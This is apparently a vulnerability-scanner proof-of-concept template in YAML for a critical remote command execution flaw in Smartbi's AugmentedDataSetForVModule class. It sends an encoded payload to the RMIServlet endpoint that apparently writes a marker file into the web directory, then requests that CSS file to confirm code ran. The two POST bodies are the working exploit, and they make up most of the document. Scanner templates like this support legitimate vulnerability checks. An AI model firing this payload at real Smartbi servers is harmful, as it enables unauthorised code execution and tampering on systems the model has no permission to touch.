name: poc-yaml-smartbi-augmenteddataset-rce
binding: 12c34936-669f-48b8-86b1-eb66e95291ae
manual: true
detail:
    author: secking
    links:
        - https://www.smartbi.com.cn/
    vulnerability:
        id: CT-529867
        level: critical
    description: smartbi 全版本AugmentedDataSetForVModule类checkJavaScript方法存在命令执行漏洞
    info: 需要有数据模型操作权限
transport: http
rules:
    r1:
        request:
            cache: false
            method: POST
            path: /smartbi/vision/RMIServlet
            headers:
                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
            body: encode=OQ-dp6kphT(k(Wpkxw4ZFwhQSp+iIpiGv(g(Wi4R5k+/JV/9V/uuRh/uu/NO/uu11MuM_mKpip_77~'Np7uK_1K((9('pN9/uu/ut/uu(SR(D/uu/NO/uu/uu/ut/uu6(dp/uu/NO/uuWi4R5kYQp42/uu/ut/uuhpDi/uu/NO/uu/uu/ut/uu5(4(dpkp4D/uu/NO/JV/JT/ut/uu_RpShD/uu/NO/JV/JT/ut/uupCk4(ikWpkkR6-/uu/NO/9V/uuk25p/uu/NO/uuxz88/uu/ut/uuiSp(4Vp_w4paCk4(ik/uu/NOk4Qp/ut/uu_(RSr(6hSp4/uu/NO/9V/uu_(RSFwhpS/uu/NO/uuW*oL/uu/9T/ut/uuR6i4pdp6k(S/uu/NO/9V/uuk25p/uu/NO6QSS/ut/uu4wbD/uu/NO6QSS/ut/uuDpkkR6-D/uu/NO/9V/9T/ut/uuiQ44p6kT(2/uu/NO_(SDp/9T/ut/uuw4hp4WpkkR6-D/uu/NO6QSS/ut/uuDd(4k~RF55tSQDkp4/uu/NO/9V/uuk25p/uu/NO/uu/uu/ut/uu_RpSh/uu/NO/uu/uu/9T/ut/uu5(4(dpkp4D/uu/NO/JV/JT/ut/uuDiIphQSpc6_w/uu/NO6QSS/9T/ut/uuDkw4p*25p/uu/NO/uuTcjat*/uu/ut/uuDIwbrRhhp6Okk4/uu/NO_(SDp/ut/uuDIwbOSR(D/uu/NOk4Qp/ut/uuSRdRk/uu/NO177/ut/uuh(k(WwQ4ip/uu/NO/uuTWqWd(4k~Rt(iIp/uu/ut/uui(k(Sw-/uu/NO/uu/uu/ut/uuDiIpd(/uu/NO/uu/uu/ut/uuk(~Sp3(dp/uu/NO/uu/uu/ut/uuhp_R6p/uu/NO/9V/uu.(g(Wi4R5k/uu/NO/uuRd5w4kL(iG(-pAL(iG(-pDq.(g(qRwE/NV/Jt6~b/u7/NT/u76pb/u7VQ__p4ph!4Rkp4A6pb/u7xRSp!4Rkp4A/Jt/uuqq/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxiDD/uxDd(4R~RySw-wDy~(GqiDD/Jt/uuEE/NV/Jt6~bqb4RkpA/Jt/uu~pK_9(J'7'Mp(((7puMK~mN7MJh~miuK/Jt/uuE/NV/Jt6~bq_SQDIAE/NV/Jt6~bqiSwDpAE/NV/uu/9T/ut/uup6(~Sp/uu/NOk4Qp/ut/uuk25p/uu/NO/uuvWyZca!/uu/9T/JT
        expression: response.status == 200 && response.body.ibcontains(bytes("H~CxOm~")) && response.body.ibcontains(bytes("5lfBh)Sfs)Mh3)f)iiAi")) && response.body.ibcontains(bytes("H~*2KC"))
    r2:
        request:
            cache: false
            method: GET
            path: /smartbi/vision/css/smaribi_logos_bak.css
        expression: response.status == 200 && response.body.ibcontains(bytes("be4f7a58086eaaa0e264b93065db9c24"))
    r3:
        request:
            cache: false
            method: POST
            path: /vision/RMIServlet
            headers:
                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
            body: encode=OQ-dp6kphT(k(Wpkxw4ZFwhQSp+iIpiGv(g(Wi4R5k+/JV/9V/uuRh/uu/NO/uu11MuM_mKpip_77~'Np7uK_1K((9('pN9/uu/ut/uu(SR(D/uu/NO/uu/uu/ut/uu6(dp/uu/NO/uuWi4R5kYQp42/uu/ut/uuhpDi/uu/NO/uu/uu/ut/uu5(4(dpkp4D/uu/NO/JV/JT/ut/uu_RpShD/uu/NO/JV/JT/ut/uupCk4(ikWpkkR6-/uu/NO/9V/uuk25p/uu/NO/uuxz88/uu/ut/uuiSp(4Vp_w4paCk4(ik/uu/NOk4Qp/ut/uu_(RSr(6hSp4/uu/NO/9V/uu_(RSFwhpS/uu/NO/uuW*oL/uu/9T/ut/uuR6i4pdp6k(S/uu/NO/9V/uuk25p/uu/NO6QSS/ut/uu4wbD/uu/NO6QSS/ut/uuDpkkR6-D/uu/NO/9V/9T/ut/uuiQ44p6kT(2/uu/NO_(SDp/9T/ut/uuw4hp4WpkkR6-D/uu/NO6QSS/ut/uuDd(4k~RF55tSQDkp4/uu/NO/9V/uuk25p/uu/NO/uu/uu/ut/uu_RpSh/uu/NO/uu/uu/9T/ut/uu5(4(dpkp4D/uu/NO/JV/JT/ut/uuDiIphQSpc6_w/uu/NO6QSS/9T/ut/uuDkw4p*25p/uu/NO/uuTcjat*/uu/ut/uuDIwbrRhhp6Okk4/uu/NO_(SDp/ut/uuDIwbOSR(D/uu/NOk4Qp/ut/uuSRdRk/uu/NO177/ut/uuh(k(WwQ4ip/uu/NO/uuTWqWd(4k~Rt(iIp/uu/ut/uui(k(Sw-/uu/NO/uu/uu/ut/uuDiIpd(/uu/NO/uu/uu/ut/uuk(~Sp3(dp/uu/NO/uu/uu/ut/uuhp_R6p/uu/NO/9V/uu.(g(Wi4R5k/uu/NO/uuRd5w4kL(iG(-pAL(iG(-pDq.(g(qRwE/NV/Jt6~b/u7/NT/u76pb/u7VQ__p4ph!4Rkp4A6pb/u7xRSp!4Rkp4A/Jt/uuqq/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxiDD/uxDd(4R~RySw-wDy~(GqiDD/Jt/uuEE/NV/Jt6~bqb4RkpA/Jt/uu~pK_9(J'7'Mp(((7puMK~mN7MJh~miuK/Jt/uuE/NV/Jt6~bq_SQDIAE/NV/Jt6~bqiSwDpAE/NV/uu/9T/ut/uup6(~Sp/uu/NOk4Qp/ut/uuk25p/uu/NO/uuvWyZca!/uu/9T/JT
        expression: response.status == 200 && response.body.ibcontains(bytes("H~CxOm~")) && response.body.ibcontains(bytes("5lfBh)Sfs)Mh3)f)iiAi")) && response.body.ibcontains(bytes("H~*2KC"))
    r4:
        request:
            cache: false
            method: GET
            path: /vision/css/smaribi_logos_bak.css
        expression: response.status == 200 && response.body.ibcontains(bytes("be4f7a58086eaaa0e264b93065db9c24"))
expression: r1() && r2() || r3() && r4()
